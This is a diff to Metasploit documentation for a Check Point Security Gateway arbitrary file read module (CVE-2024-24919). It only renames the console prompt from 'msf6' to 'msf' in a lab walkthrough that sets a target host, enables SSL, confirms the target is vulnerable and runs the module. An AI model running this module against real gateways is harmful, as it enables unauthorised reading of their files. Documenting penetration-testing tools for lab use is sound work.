@@ -57,7 +57,7 @@ To set up a test environment:
 ## Scenarios
 ### Check Point Security Gateway Linux
 ```
-msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > show options 
+msf auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > show options 
 
 Module options (auxiliary/gather/checkpoint_gateway_fileread_cve_2024_24919):
 
@@ -75,14 +75,14 @@ Module options (auxiliary/gather/checkpoint_gateway_fileread_cve_2024_24919):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > set RHOSTS 192.168.181.128
+msf auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > set RHOSTS 192.168.181.128
 RHOSTS => 192.168.181.128
-msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > set SSL true
+msf auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > set SSL true
 [!] Changing the SSL option's value may require changing RPORT!
 SSL => true
-msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > check
+msf auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > check
 [+] 192.168.181.128:443 - The target is vulnerable. Arbitrary file read successful!
-msf6 auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > run
+msf auxiliary(gather/checkpoint_gateway_fileread_cve_2024_24919) > run
 [*] Running module against 192.168.181.128
 
 [*] Running automatic check ("set AutoCheck false" to disable)
